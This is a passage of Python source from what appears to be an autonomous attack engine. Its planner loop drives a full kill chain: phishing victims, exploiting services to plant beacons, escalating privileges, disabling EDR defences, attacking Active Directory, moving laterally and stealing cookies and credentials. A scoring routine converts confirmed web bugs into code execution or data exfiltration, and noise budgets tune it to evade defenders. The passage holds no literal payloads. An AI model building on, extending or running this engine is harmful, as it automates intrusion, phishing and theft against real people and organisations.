                       detail=(f"{len(spawned)} proposal(s) drafted in "
                               "background — see docs/evolution/ and the "
                               "PR on auto-evolution/* for review"
                               if proposal else
                               f"{len(spawned)} authoring sub-agent(s) "
                               "running in background — PR(s) will appear "
                               "on auto-evolution/* for review"))

    def _deep_ladder(self) -> List[str]:
        """The deep run's stage order for THIS run profile.

        `evasion` is deliberately NOT in the static DEEP_STAGES: disabling
        the defensive stack (edr_disable) is aggressive-only, so it is
        inserted at run time right after privesc (which grants the SYSTEM
        session it needs) and before the loud AD/pivot stages. A
        stealth/default deep run never touches the defensive stack.
        """
        stages = list(DEEP_STAGES)
        if self.aggressive:
            stages.insert(stages.index("post_exploit") + 1, "evasion")
        return stages

    def _drive_stage(self, goal: str, max_iterations: int,
                     checkpoint_path: Optional[str], orch,
                     phase_wait: Optional[str],
                     phase_wait_timeout: float) -> bool:
        """Drive ONE planner goal to its terminal condition: True when the
        stage's goal facts exist, False when the stage exhausted its moves
        (bounded recoveries) without reaching them. Shared by single-goal
        runs (goal != deep) and every stage of a deep run."""
        # the stage IS part of the arbiter's state: the progress lens measures
        # a move against where the chain actually is, and a post-exploitation
        # stage weighs blast radius differently from a footprint one.
        self._current_stage = goal
        self._ensure_cells(goal)
        try:
            if getattr(self, "cells", None) is not None:
                self.cells.set_stage(goal)
        except Exception:
            pass
        if getattr(self, "_cells_failed", False) or getattr(self, "cells", None) is None:
            self._emit("halt", goal=goal,
                       reason=("cell roster unavailable: refusing to fall "
                               "back to the removed planning path"))
            return False
        for _ in range(max_iterations):
            # operator stop is cooperative and observed at every boundary:
            # an in-flight capability finishes, the loop then exits
            if self._stop_requested():
                self._emit("halt", reason="stopped by operator")
                return False
            # campaign cooperation: import peers' high-value findings once
            self._absorb_shared()
            if phase_wait and not self.wm.has_any(phase_wait):
                if not self._wait_phase(phase_wait, phase_wait_timeout):
                    self._emit("halt", reason=(
                        f"phase gate timeout: '{phase_wait}' never "
                        f"materialised (worker stays quiet)"))
                    return False
            # reasoning: findings -> deduced findings + hypotheses, then
            # the hypotheses bias the planner (preferred sources first)
            reason = self.reasoning.run(self.wm, peers=self.share.peers)
            if reason.findings:
                self._emit("inference", findings=[
                    {"kind": f.kind, "key": f.key, "value": f.value}
                    for f in reason.findings])
            if reason.hypotheses:
                self._emit("reason", hypotheses=[
                    {"capability": h.capability_id, "reason": h.reason,
                     "priority": round(h.priority, 2)}
                    for h in reason.hypotheses])
            prefs = list(reason.preferences)
            # I4: the identity FIELD graph — which field to widen first. Emitted
            # so the operator sees the DAG (nodes=campi, archi=deduzioni) and
            # the ranked frontier, and kept for the report.
            try:
                self._identity_field_model = self._identity_field_plan()
                if self._identity_field_model:
                    self._emit("identity_field",
                               **self._identity_field_model)
            except Exception as exc:
                self._degrade("identity_field", exc)
            # optional local-LLM advisor: adds candidate capability ids
            # only (never authorizes). Validated against the registry
            # and, in paranoid mode, stripped of loud capabilities.
            llm_prefs = self.llm_advisor.suggest(self.wm, self.registry)
            if llm_prefs:
                self._emit("llm", hypotheses=llm_prefs)
                for cid in llm_prefs:
                    if cid not in prefs:
                        prefs.append(cid)
            # buco 2: the QUIET cells reason in PARALLEL over their own
            # scoped candidates and their own world views; the consensus
            # joins the planner preferences (a preference, exactly like the
            # LLM advisor — never an authority, never a bypass of a gate)
            try:
                self._parallel_reasoning(goal, prefs)
            except Exception as exc:
                self._degrade("parallel_reasoning", exc)
            # ingest any new actions into the experience memory BEFORE
            # planning, so the current run's own failures already inform
            # the next move (that is the "it got stuck before, now it does
            # not" behaviour, within a single engagement).
            try:
                self.experience.sync(self.wm)
            except Exception:
                pass
            plan = self.planner.plan_strategic(
                self.wm, goal=goal, dead=self._dead_cap_ids(),
                preference=prefs, ledger=self.ledger)
            # the strategy the run is CURRENTLY on, so a stall recovery can
            # ask the fallback engine "and what else you got?" with context
            self._current_strategy = plan.strategy or ""
            # buco 3 + B3: the plan as an explicit DAG (the run's mental
            # model) AND the arbitration between PLAN VARIANTS. B3 used to
            # stop at the model; now the run scores the alternative plans
            # the same planner already produces (reorderings, never new
            # gates) on their DAGs, under the current signals, and adopts a
            # variant only when it clearly beats the default. The default
            # plan is byte-identical when nothing wins, so this can only
            # improve a plan, never silently rewrite one.
            try:
                plan = self._arbitrate_plan(plan, goal, prefs)
            except Exception as exc:
                self._degrade("plan_arbiter", exc)
            try:
                if getattr(self, "cells", None) is not None:
                    self._plan_model = self.cells.plan_graph(
                        plan, self._goal_facts())
            except Exception as exc:
                self._degrade("plan_graph", exc)
            # degradation tracking: when the planner could not reach this
            # goal for the target TYPE and fell back (identity->footprint on
            # an IP, network->OSINT on an email), record the fallback so
            # _goal_reached can accept the degraded terminal state instead
            # of spinning recoveries after facts that can never exist.
            if plan.strategy.startswith("fallback:"):
                try:
                    self._fallback_goal = plan.strategy.split("->", 1)[1]
                except (IndexError, AttributeError):
                    self._fallback_goal = ""
            elif getattr(self, "_fallback_goal", "") and plan.steps:
                # a normal (non-fallback) plan with steps: goal is live again
                self._fallback_goal = ""
            self._emit("plan", steps=[s.capability.id for s in plan.steps],
                       complete=plan.complete,
                       strategy=plan.strategy,
                       strategy_chain=plan.strategy_chain,
                       strategic=plan.strategic)
            if plan.complete and not plan.steps:
                return True  # stage goal already satisfied
            if not plan.steps:
                # no path to the goal right now: escalate instead of
                # halting — re-arm failed capabilities (bounded) so the
                # agent keeps probing alternate angles toward the beacon
                if self._recover_stall(goal):
                    continue
                # WHY it halted: the planner's rejections carry the concrete
                # reason per candidate (stealth-gated for this profile, tool
                # missing, already failed with no new facts, needs a fact
                # that can no longer be produced). The operator used to get
                # "no affordable path to goal" and nothing else.
                rejections = [r.to_dict() for r in plan.rejected][:8]
                self._emit("halt", reason=plan.blocked_reason or "no plan",
                           goal=goal, rejected=rejections,
                           rejected_total=len(plan.rejected))
                return False
            # submit the plan (cheapest-first order), skipping failed caps
            # unless new facts make them viable again. Only steps whose
            # preconditions hold NOW are submitted: the chain executes in
            # waves as facts arrive (osint -> phish -> poll -> victim_ip
            # -> scan -> ...), the rest is re-planned next iteration.
            submitted = False
            for step in reversed(plan.steps):
                if not self._retry_eligible(step.capability):
                    continue
                try:
                    if not all(p(self.wm) for p in step.capability.preconditions):
                        continue  # deferred: needs facts this plan produces
                except Exception:
                    # a precondition that RAISES is NOT satisfied: defer, do
                    # not submit. This mirrors _execute_capability exactly —
                    # submitting a step whose gate blew up only puts it back
                    # in the queue to be deferred again, and (worse) reads a
                    # bug as an open door.
                    continue
                orch.submit(step.capability.id, self.target,
                            priority=self._priority(step),
                            slot_values=step.slot_values)
                submitted = True
            if not submitted:
                # every candidate move is stale/deferred: escalate (bounded)
                # rather than giving up before the beacon is injected
                if self._recover_stall(goal):
                    continue
                rejected = [r.to_dict() for r in plan.rejected][:8]
                # name the moves that were stale, so "no new move" is not a
                # mystery: these are the capabilities whose retry is blocked
                stale = [s.capability.id for s in plan.steps
                         if not self._retry_eligible(s.capability)][:6]
                self._emit("halt",
                           reason="no new move available "
                                  "(all failed capabilities are stale)",
                           goal=goal, rejected=rejected,
                           rejected_total=len(plan.rejected),
                           stale=stale)
                return False
            # hunt_web can legitimately run ~60-90s (bounded probe
            # budget); a 120s drain timeout would cut it mid-run and
            # cause overlapping re-plans. Give the drain generous
            # headroom so long capabilities finish in one pass.
            orch.run(drain_timeout=600.0)  # drains until empty
            self._recoveries = 0  # a move ran: reset the stall counter
            # close the loop: facts just produced confirm/refute the
            # pending hypotheses (fact-based, so ordering never matters)
            self._resolve_hypotheses()
            # ONE-SHOT generative fuzz pass once a web surface exists:
            # the findings land as hunt_anomaly facts the planner pivots on.
            # Bounded (48 requests / 90s) and never blocks the chain.
            try:
                if (self.wm.find("web_app") or self.wm.find("web_header")) \
                        and not getattr(self, "_fuzzed", False):
                    self._fuzzed = True
                    self._run_web_fuzz()
            except Exception as exc:
                # the pass is non-blocking by design, but SILENTLY eating the
                # failure hides a broken fuzz engine behind a plain "no
                # findings": surface it as a degradation instead.
                self._degrade("web_fuzz", exc)
            # ONE-SHOT origin discovery once an edge is known (or the gate
            # fired): public data only, bounded, and it unlocks the whole
            # footprint stage against the machine behind the CDN.
            try:
                self._maybe_origin_discovery()
            except Exception as exc:
                self._degrade("origin_discovery", exc)
            if checkpoint_path:
                try:
                    self.save_state(checkpoint_path)
                except Exception:
                    pass
            if self._goal_reached(goal):
                self._emit("success", detail=f"goal {goal} satisfied")
                return True
        return self._goal_reached(goal)

    def _wait_phase(self, fact_kind: str, timeout: float) -> bool:
        """Poll for a WorldModel fact (shared across same-target workers);
        used to keep phase workers quiet until their phase facts exist."""
        started = time.time()
        while time.time() - started < timeout:
            if self.wm.has_any(fact_kind):
                self._emit("gate", fact=fact_kind,
                           waited=round(time.time() - started, 1))
                return True
            time.sleep(2.0)
        return False

    def _goal_reached(self, goal: str) -> bool:
        from phantom.automation.planner import GOAL_FACTS
        goal_facts = GOAL_FACTS.get(goal, GOAL_FACTS["complete_kill_chain"])
        if all(self.wm.has_any(g) for g in goal_facts):
            return True
        # graceful-degradation acceptance — ONLY when the planner actually
        # degraded this run (fallback: strategy recorded in _drive_stage):
        # the fallback goal's facts are the honest terminal state for this
        # target class, and chasing the original facts would just burn the
        # recovery budget repeating probes ("no affordable path" loops).
        fb_goal = getattr(self, "_fallback_goal", "")
        if fb_goal and fb_goal != goal:
            fb_facts = GOAL_FACTS.get(fb_goal, [])
            if fb_facts and any(self.wm.has_any(f) for f in fb_facts):
                return True
        return False

    def _resolve_hypotheses(self) -> List[Dict[str, str]]:
        """Close pending hypotheses against the world state (fact-based):
        confirmed when the capability's effect fact is present, refuted when
        it ran without producing it, abandoned when it could never run."""
        try:
            resolved = self.reasoning.resolve(
                self.wm, failed_cap_ids=self._failed_caps)
        except Exception as exc:      # the reasoning layer must not die mute
            self._degrade("hypotheses", exc)
            return []
        if resolved:
            self._emit("hypothesis", resolved=resolved)
        return resolved

    # ----------------------------------------------------------- reasoning R1/R2/R3

    def _goal_facts(self) -> tuple:
        """The fact kinds that mean "this stage is done" (planner contract)."""
        try:
            from phantom.automation.planner import GOAL_FACTS
            return tuple(GOAL_FACTS.get(
                self.goal or "complete_kill_chain", ()) or ())
        except Exception:
            return ()

    def _arbitrate_plan(self, plan: Any, goal: str, prefs: List[str]) -> Any:
        """B3: arbitrate between plan VARIANTS on their DAGs.

        `plan` is the planner's own pick and stays the default. The arbiter
        is shown alternative reorderings of the SAME planner (a preference
        ordering can only reorder already-allowed moves) and adopts one only
        when it clearly beats the default under the current signals. The
        choice is emitted and kept for the report; on any failure the run
        keeps the default plan. Never raises.
        """
        try:
            from phantom.automation.brain.plan_arbiter import (
                PlanArbiter, build_variants)
            goal_facts = self._goal_facts()
            variants = build_variants(
                self.planner, self.wm, goal, prefs=prefs, ledger=self.ledger,
                goal_facts=goal_facts, primary=plan,
                dead=self._dead_cap_ids())
            choice = PlanArbiter().choose(
                variants, sig=self._signals(), prefer="primary")
            if choice is None:
                return plan
            self._plan_choice = choice.to_dict()
            self._emit("plan_variants", **self._plan_choice)
            # CONSERVATIVE ADOPTION: a variant only REPLACES the planner's
            # plan when the default is not actually usable (incomplete or
            # empty) and the winner is complete. A working plan is never
            # silently rewritten — the alternative reorderings the planner
            # produces can look complete (same declared effects) while being
            # semantically weaker (a fact whose source is known to fail), and
            # second-guessing a working chain is how a run loses its beacon.
            default_usable = bool(getattr(plan, "complete", False)
                                  and getattr(plan, "steps", None))
            if (not default_usable and choice.decided
                    and getattr(choice.winner.plan, "complete", False)
                    and getattr(choice.winner.plan, "steps", None)):
                self._plan_choice["adopted"] = choice.winner.variant_id
                return choice.winner.plan
            return plan
        except Exception as exc:
            self._degrade("plan_arbiter", exc)
            return plan

    def _identity_field_plan(self) -> Optional[dict]:
        """I4: build the identity FIELD graph (nodes=campi, archi=deduzioni)
        and return the operator-facing payload: the DAG, the critical path
        and the ranked frontier (which field to widen first).

        Only built when the world carries identity context; returns None
        otherwise so a network run emits nothing. Never raises into the run.
        """
        try:
            wm = self.wm
            if not (wm.has_any("identity") or wm.has_any("profile")
                    or wm.has_any("email_masked")
                    or wm.has_any("email_candidate")
                    or wm.has_any("email_verified")):
                return None
            from phantom.automation.brain.identity import IdentityReasoner
            from phantom.automation.brain.identity_graph import (
                IdentityFieldGraph)
            active, contact = self._identity_consent_state()
            derivations = IdentityReasoner(
                active_consent=active, contact_consent=contact).reason(wm)
            graph = IdentityFieldGraph.from_reasoner(derivations, wm)
            if not graph.nodes:
                return None
            payload = graph.to_dict()
            payload["next"] = [p.node_id for p in
                               graph.next_fields(top=5,
                                                 allow_active=active,
                                                 allow_contact=contact)]
            return payload
        except Exception:
            return None

    def _identity_consent_state(self) -> tuple:
        """(active, contact) from the world model stamped by the agent."""
        consent = getattr(self.wm, "identity_consent", None)
        if not isinstance(consent, dict):
            return (False, False)
        return (bool(consent.get("active")), bool(consent.get("contact")))

    def _open_hypothesis_caps(self) -> List[str]:
        """Capabilities named by an OPEN hypothesis. R3 uses these for the
        info-gain reward: a move that discriminates between live beliefs is
        worth more than one that merely scores well."""
        try:
            return [h.capability_id for h in self.wm.hypotheses
                    if getattr(h, "status", "") == "pending"
                    and getattr(h, "capability_id", "")]
        except Exception:
            return []

    def _signals(self):
        """The engagement state the arbiter adapts to (event-derived)."""
        from phantom.automation.brain.lenses import signals_from
        return signals_from(self.wm,
                            stage=self._current_stage or (self.goal or ""),
                            stall_class=self._last_stall)

    def _decision_for(self, step: PlanStep, base: float) -> float:
        """R1/R2: arbitrate ONE move and keep its explanation.

        The value stays within a bounded band around the legacy expected
        value; the DECISION RECORD is the point — the operator (and the
        report) can see which lens drove a move instead of trusting a
        number.
        """
        try:
            from phantom.automation.brain.lenses import view_of
            view = view_of(step, goal_facts=self._goal_facts(),
                           success_prior=1.0,
                           open_hypothesis_caps=self._open_hypothesis_caps())
            decision = self.arbiter.evaluate(view, base, self._signals())
            self._decisions[view.id] = decision
            # the ledger keeps CHANGES: re-planning the same move the same
            # way is not a new decision, and would bury the history
            entry = self.trace.note(
                decision, stage=self._current_stage or (self.goal or ""))
            if entry is not None:
                self._emit("decision", capability=view.id,
                           detail=entry.explain(), driver=entry.driver,
                           stage=entry.stage, seq=entry.seq)
            return decision.value
        except Exception as exc:      # a broken lens must not be silent
            self._degrade("arbiter", exc)
            return base

    def _degrade(self, layer: str, exc: BaseException) -> None:
        """Announce ONCE that a reasoning layer failed and the run fell back
        to the raw heuristic.

        A silent `except: return base` looks exactly like competence: the
        move still happens, the explanation just quietly disappears. The
        operator has to be able to tell "the arbiter weighted this" from
        "the arbiter was dead and we used a constant".
        """
        seen = getattr(self, "_degraded_layers", None)
        if seen is None:
            seen = self._degraded_layers = set()
        key = f"{layer}:{type(exc).__name__}"
        if key in seen:
            return
        seen.add(key)
        self._emit("degraded", layer=layer,
                   detail=f"{type(exc).__name__}: {str(exc)[:120]}")

    def search_policy(self) -> str:
        """The current search MODE (breadth/depth/identity), promoted from
        the stall classifier so "what to do about being stuck" is a mode the
        whole cell follows instead of a canned move list."""
        try:
            return self.arbiter.search_policy(self._signals())
        except Exception as exc:
            self._degrade("search_policy", exc)
            return "adaptive"

    # --------------------------------------------------- cells (C2/C4)

    def _chain_class(self) -> str:
        """The class driving the chain (the roster is built from it)."""
        try:
            return str(self.ledger.chain_class())
        except Exception:
            return ""

    def _ensure_cells(self, goal: str) -> None:
        """Bind the run's cell team once, at the first planning pass.

        The roster IS the authority: strict mode is unconditionally on, so a
        capability whose category no coverage role owns is refused with a
        reason instead of falling through to a second planning path. The
        coverage (the doctrine chain plus the goal the run walks) is what
        makes that safe — `COVERED_GOALS` is the audited vocabulary and the
        coverage gate in `tests/test_stage_migration.py` keeps it audited.

        Entries are GOALS, not doctrine chain stages: `_drive_stage` sets
        `_current_stage` to the goal it was handed, so a chain stage name
        like "footprint" never matches.

        If the roster cannot be built the run must NOT silently revert to
        the removed planning path: the failure is recorded and `_drive_stage`
        halts the stage with an explicit reason.
        """
        if getattr(self, "cells", None) is not None:
            return
        try:
            from phantom.automation.brain.cell_runtime import CellRuntime
            from phantom.automation.brain.cells import COVERED_GOALS
            # `self.cell_stages` is kept for telemetry and explicit
            # trialling, but it no longer gates the authority: every goal
            # the run can walk is in the audited vocabulary.
            self.cell_stages = tuple(self.cell_stages) or tuple(COVERED_GOALS)
            self.cells = CellRuntime(
                goal=goal, target_type=self.target_type,
                cls=self._chain_class(), aggressive=self.aggressive,
                paranoid=self.paranoid, speed=self.speed,
                explicit_profile=self.reason_profile,
                strict=True,
                emit=lambda k, d: self._emit(k, **d))
            self.cells.start()
            self.cells.set_stage(goal)
            self._cells_failed = False
        except Exception as exc:      # a roster must never break a run
            self.cells = None
            self._cells_failed = True
            self._emit("note", capability="cells",
                       detail=f"roster unavailable: {exc}")

    def _cell_strict_here(self) -> bool:
        """The roster is the authority whenever it exists (C4 complete)."""
        return bool(self.cells is not None and self.cells.strict)

    def _exec_with_permit(self, step: PlanStep) -> bool:
        """C2: route an action to its owning cell and take the egress permit.

        Both refusal (no cell owns this capability) and deferral (the permit
        is busy) are NOT failures: the capability is left available so the
        next planning pass can run it. That mirrors the existing
        precondition-deferral contract, which is what keeps a serialised
        engagement from losing work.

        There is no lenient fall-through any more: a capability the roster
        cannot own is refused AND reported, because a silent second planning
        path is exactly what C4 removed.
        """
        cells = getattr(self, "cells", None)
        if cells is None:
            self._emit("blocked", capability=getattr(step.capability, "id", ""),
                       reason=("no cell roster: refusing rather than falling "
                               "back to the removed planning path"))
            return False
        cap = step.capability
        stage = self._current_stage
        cell = cells.cell_for(cap, stage, stage_scoped=True)
        if cell is None:
            cells.unrouted += 1
            cells.refused += 1
            self._emit("blocked", capability=cap.id,
                       reason=(f"no cell owns category '{cap.category}' for "
                               f"stage '{stage}'"))
            return False
        cells.routed += 1
        if cell.advisory:
            cells.refused += 1
            self._emit("blocked", capability=cap.id,
                       reason=f"cell {cell.cell_id} is advisory (no egress "
                              "permit): it reasons, it does not act")
            return False
        if not cells.admit(cell):
            cells.deferred += 1
            self._emit("deferred", capability=cap.id,
                       reason=(f"egress permit busy ({cell.cell_id}): contact "
                               "with the target is serialised"))
            return False
        # buco 4: the run's noise pool is a CONTESTED resource. Charge it
        # only once the permit is held (a permit deferral must not spend),
        # and release on overspend so the deferral loses no work.
        if not cells.charge(cell, cap):
            cells.release(cell)
            cells.deferred += 1
            self._emit("deferred", capability=cap.id,
                       reason=("run noise budget exhausted: deferred rather "
                               "than spending exposure the run no longer "
                               "has"))
            return False
        try:
            return self._execute_capability(step)
        finally:
            cells.release(cell)

    def _parallel_reasoning(self, goal: str, prefs: list) -> Optional[str]:
        """Buco 2 — the contact-free cells reason CONCURRENTLY.

        Each CONTACT_NONE cell is handed the candidates it is AWARE of and
        its own view of the map; the runtime rates them in parallel threads
        (concurrency is a property of the action: a target-touching role is
        serialised and takes no part) and the consensus joins the planner
        preferences — a preference, never an authority.

        Returns the consensus capability id, or None when there is nothing
        to parallelise (< 2 quiet cells) or nothing ranked.
        """
        cells = getattr(self, "cells", None)
        if cells is None:
            return None
        from phantom.automation.brain.cells import CONTACT_NONE
        quiet = [c for c in cells.team.cells
                 if not c.advisory and c.spec.contact == CONTACT_NONE]
        if len(quiet) < 2:            # nothing to parallelise
            return None
        plan = self.planner.plan_strategic(self.wm, goal=goal, max_steps=8)
        steps = list(getattr(plan, "steps", []) or [])
        if not steps:
            return None
        from phantom.automation.brain.lenses import view_of
        goal_facts = self._goal_facts()
        open_hyp = self._open_hypothesis_caps()
        base_of = {st.capability.id: self._priority(st) for st in steps}
        views_by_cell: Dict[str, list] = {}
        for c in quiet:
            aware = set(c.capability_ids(self.registry))
            views_by_cell[c.cell_id] = [
                view_of(st, goal_facts=goal_facts,
                        open_hypothesis_caps=open_hyp)
                for st in steps
                if not aware or st.capability.id in aware]
        opinions = cells.parallel_opinions(
            views_by_cell, base_of, self._signals())
        if not opinions:
            return None
        consensus, _score = cells.consensus(opinions)
        if consensus and consensus not in prefs:
            prefs.append(consensus)
        return consensus

    def _second_opinion(self, goal: str) -> Optional[dict]:
        """C2: when a cell stalls, let the escalated peer rate the candidate
        set with its own objective AND its own view of the world.

        The peer's pick is adopted only when the tribunal says the lead's
        weighting was the artifact (or the lead's pick is vetoed by the
        stricter profile). The peer also reasons over the facts IT can see
        (buco 1): candidates outside its scope are excluded from its
        ranking, and its `visibility` signal is derived from its own view,
        so it is a second REASONING, not a relabel of the lead's.
        """
        cells = getattr(self, "cells", None)
        if cells is None:
            return None
        try:
            from dataclasses import replace as _replace
            from phantom.automation.brain.lenses import view_of
            plan = self.planner.plan_strategic(self.wm, goal=goal, max_steps=6)
            steps = list(getattr(plan, "steps", []) or [])
            if not steps:
                return None
            goal_facts = self._goal_facts()
            open_hyp = self._open_hypothesis_caps()
            findings = self.wm.all_findings()
            # audit what every cell can and cannot see for this decision
            scope = cells.report_scope(findings)
            peer = next((c for c in cells.team.advisory_cells()), None)
            peer_view = (cells.scope_of(peer.cell_id, findings)
                         if peer is not None else None)
            peer_ids = (set(peer.capability_ids(self.registry))
                        if peer is not None else set())
            views, peer_views, base_of = [], [], {}
            blind = 0
            for st in steps:
                cid = st.capability.id
                base = self._priority(st)
                view = view_of(st, goal_facts=goal_facts,
                               open_hypothesis_caps=open_hyp)
                views.append(view)
                base_of[cid] = base
                # the peer may only rate what it is AWARE of
                if peer_ids and cid not in peer_ids:
                    blind += 1
                    continue
                peer_views.append(view)
            peer_signals = None
            if peer_view is not None:
                # the peer's picture of the world, not the run's
                peer_signals = _replace(
                    self._signals(),
                    visibility=any(k in peer_view.kinds()
                                   for k in ("service", "web_app", "web_header",
                                             "banner", "os")))
            dispute = cells.second_opinion(
                views, base_of, self._signals(),
                peer_views=peer_views, peer_signals=peer_signals)
            out = dispute.to_dict() if dispute is not None else None
            if out is not None:
                out["scope"] = {
                    "shared_facts": scope.get("shared_facts", 0),
                    "peer_visible": len(peer_view.visible) if peer_view else 0,
                    "peer_hidden": peer_view.hidden if peer_view else 0,
                    "peer_candidates": len(peer_views),
                    "peer_blind_candidates": blind,
                }
            return out
        except Exception:
            return None

    def _stealth_veto(self, cap) -> str:
        """R2: the stealth lens' veto, checked at EXECUTION time so no
        scheduler path can bypass it. Returns the reason, or "".

        Defensive by contract: a half-built agent (tests construct one with
        __new__) must run, not crash, and the absence of an arbiter means
        "no opinion" rather than "allow".
        """
        arb = getattr(self, "arbiter", None)
        if arb is None:
            return ""
        try:
            from phantom.automation.brain.lenses import view_of
            view = view_of(cap, goal_facts=self._goal_facts())
            return arb.hard_veto(view, self._signals())
        except Exception:
            return ""

    def _payoff_bonus(self, step: PlanStep) -> float:
        """Convert a CONFIRMED bug into its PAYOFF before anything else.

        A confirmed code-execution or session primitive is the most
        valuable fact an engagement holds and it is worth NOTHING until
        the move that discharges it runs. Without this the planner can
        confirm a command injection and then wander off to re-scan — the
        finding sits unconsumed. The bonus makes the payoff move win while
        the primitive is unconsumed, and it disappears the moment the
        payoff finding exists (so the run does not loop on it).
        """
        effects = set(step.capability.effects or [])
        payoffs_by_class = {
            "cmdi": ("rce_foothold",), "ssti": ("rce_foothold",),
            "deser": ("rce_foothold",), "ssrf": ("cloud_creds",),
            "traversal": ("file_read",), "sqli": ("creds",),
            "xss": ("xss_exfil",),
        }
        try:
            already = {kind for kind in
                       ("rce_foothold", "cloud_creds", "creds",
                        "file_read", "xss_exfil")
                       if self.wm.find(kind)}
            for f in self.wm.find("hunt_anomaly"):
                v = f.value if isinstance(f.value, dict) else {}
                if not v.get("confirmed"):
                    continue
                for payoff in payoffs_by_class.get(str(v.get("cls") or ""), ()):
                    if payoff in effects and payoff not in already:
                        return 8.0
        except Exception:
            return 0.0
        return 0.0

    def _priority(self, step: PlanStep) -> float:
        # expected value heuristic: cheap + low detection wins
        # KILL-CHAIN ORDER: before any service is known, the footprint scan
        # outranks everything (a blind http_probe/ssh_banner fired before
        # the scan "fails" and reads as a random order). Once services
        # exist, the normal value ranking applies.
        if not self.wm.has_any("service") and "service" in step.capability.effects:
            return 100.0
        risk = self.blue_team.risk(step.capability.category,
                                   step.capability.stealth_level,
                                   step.capability.opsec_cost)
        priority = (1.0 - risk) / max(0.1, step.capability.opsec_cost)
        # enterprise: bounded success-rate prior learned this engagement
        priority = self.enterprise.prior(step.capability.id,
                                         step.capability.category, priority)
        # threat intel: a version-matched exploit targeting a CVE that is
        # actively exploited in the wild is worth prioritizing now
        if step.capability.id == "service_exploit":
            try:
                from phantom.automation.guidance.kit import _best_fingerprinted_module
                module, _ = _best_fingerprinted_module(self.wm)
                if module is not None and self.enterprise.cve_threat(
                        module.cve_id).get("exploited"):
                    priority *= 1.5
            except Exception:
                pass
        if step.capability.category == "post":
            priority -= 10.0  # post-exploitation ALWAYS runs after the beacon
        # reasoning -> action: a confirmed-but-unconsumed bug outranks
        # ordinary moves, so the run weaponizes what it already proved
        priority += self._payoff_bonus(step)
        # R1/R2: state-dependent arbitration on top of the expected value
        return self._decision_for(step, priority)

    def _orchestrator_worker(self, action: PrioritizedAction, ctx: dict) -> bool:
        cap = self.registry.get(action.capability_id)
        if cap is None:
            return False
        step = PlanStep(capability=cap, slot_values=action.slot_values)
        before = len(self.wm.actions_taken)
        ok = self._exec_with_permit(step)
        # enterprise learning: record only REAL attempts (an action was
        # recorded), never deferrals/blocks; ok == made new progress
        if len(self.wm.actions_taken) > before:
            self.enterprise.record(cap.id, ok)
            _record_health(cap.id, ok)
        return ok

    def _compute_job_pin(self) -> Dict[str, Any]:
        """P1-5 job pin: the immutable identity of this run's engine —
        registry digest, knowledge/guidance version, capability count and
        the learned ids visible at START time. A capability that appears
        mid-run is NOT in this snapshot and must not be scheduled by it."""
        import hashlib
        try:
            from phantom.automation.guidance.commands import make_registry
            caps = sorted(c.id for c in make_registry().all())
        except Exception:
            caps = []
        learned = [c for c in caps if c.startswith("learned.")]
        return {
            "engine_commit": _engine_commit(),
            "knowledge_version": time.strftime("%Y%m%d%H%M%S",
                                               time.gmtime()),
            "policy_version": 1,
            "registry_digest": hashlib.sha256(
                ",".join(caps).encode("utf-8", "replace")).hexdigest()[:16],
            "capability_count": len(caps),
            "learned_ids": learned,
        }

    def _finalize(self) -> Dict[str, Any]:
        beacons = self.wm.find("beacon")
        creds = self.wm.find("creds", valid=True)
        services = self.wm.find("service")
        return {
            "target": self.target,
            "goal": self.goal,
            "job_pin": getattr(self, "job_pin", {}),
            "stages": dict(self._stage_outcomes or {}),
            "beacon_id": self._session.beacon_id if self._session else "",
            "beacon_established": bool(beacons),
            "beacon_count": len(beacons),
            "creds_found": len(creds),
            "services_enumerated": len(services),
            "hunt_anomalies": len(self.wm.find("hunt_anomaly")),
            "identity_profiles": len(self.wm.find("identity")),
            "victim_ips": len(self.wm.find("victim_ip")),
            "phishes_sent": len(self.wm.find("phish")),
            "persistence_installed": bool(self.wm.find("persistence")),
            "system_privilege": bool(self.wm.find("system_privilege")),
            "beacon_injected": bool(self.wm.find("injection")),
            "ad_domains": len(self.wm.find("ad_domain")),
            "ad_creds": len(self.wm.find("ad_creds")),
            "cracked_hashes": len(self.wm.find("cracked")),
            "lateral_movements": len(self.wm.find("pivot")),
            "cleanup_done": bool(self.wm.find("cleanup")),
            "stolen_cookies": len(self.wm.find("stolen_cookies")),
            "bt_devices": len(self.wm.find("bt_device")),
            "cdp_cookie_sets": len(self.wm.find("cdp_cookies")),
            "socks_proxies": len(self.wm.find("socks_proxy")),
            "trojan_bundles": len(self.wm.find("trojan_bundle")),
            "inferences": len([f for f in self.wm.all_findings()
                              if f.source == "reasoning"]),
            "hypotheses": len(self.wm.hypotheses),
            "hypotheses_confirmed": len([h for h in self.wm.hypotheses
                                        if h.status == "confirmed"]),
            "hypotheses_refuted": len([h for h in self.wm.hypotheses
                                      if h.status == "refuted"]),
            "hypotheses_abandoned": len([h for h in self.wm.hypotheses
                                        if h.status == "abandoned"]),
            "opsec_spent": round(self.wm.opsec_spent, 2),
            "actions_taken": len(self.wm.actions_taken),
            "failures": len(self.wm.failures),
            "campaign_trail": [e for e in self.sink.events],
            "cells": (self.cells.to_dict()
                      if getattr(self, "cells", None) is not None else {}),
            "cell_stats": (self.cells.stats()
                           if getattr(self, "cells", None) is not None else {}),
        }


def _engine_commit() -> str:
    """Best-effort commit of the running engine (P1-5 pin). Empty string
    when not a git checkout — the pin still carries the registry digest."""
    try:
        import subprocess
        proc = subprocess.run(
            ["git", "rev-parse", "--short", "HEAD"], capture_output=True,
            text=True, timeout=5, cwd=os.path.dirname(
                os.path.dirname(os.path.abspath(__file__))))
        if proc.returncode == 0:
            return (proc.stdout or "").strip()
    except Exception:
        pass
    return ""


def _make_experience(enabled: bool):
    """Build the case-based experience memory (see brain/experience).

    `enabled=True` means GLOBAL/cross-engagement persistence (the run
    records episodes into data/experience_cases.json on the operator's
    own disk); False keeps the memory inside the current engagement
    (in memory only). Entry points resolve the operator's choice via
    config `automation.experience` (default true) / --no-experience and
    pass the RESOLVED value here, so the planner can never read unset.
    """
    from phantom.automation.brain.experience import Experience
    return Experience(enabled=bool(enabled))


def experience_receipt(store) -> str:
    """One-line end-of-run learning receipt from an Experience (or a bare
    CaseStore).

    Names what the run recorded, what the next run will do differently,
    and where the memory lives — the visible proof the engine learns.
    """
    stats = store.stats()
    run = stats.get("run") or {}
    run_state = getattr(store, "_run", None)
    eps_list = (list(run_state.episodes) if run_state is not None
                else list(getattr(store, "episodes", []) or []))
    eps = len(eps_list) if run_state is not None \
        else int(run.get("episodes", len(eps_list)) or 0)
    repairs = int(run.get("repairs_learned",
                          sum(1 for e in eps_list
                              if getattr(e, "repair", ""))) or 0)
    pattern = ""
    try:
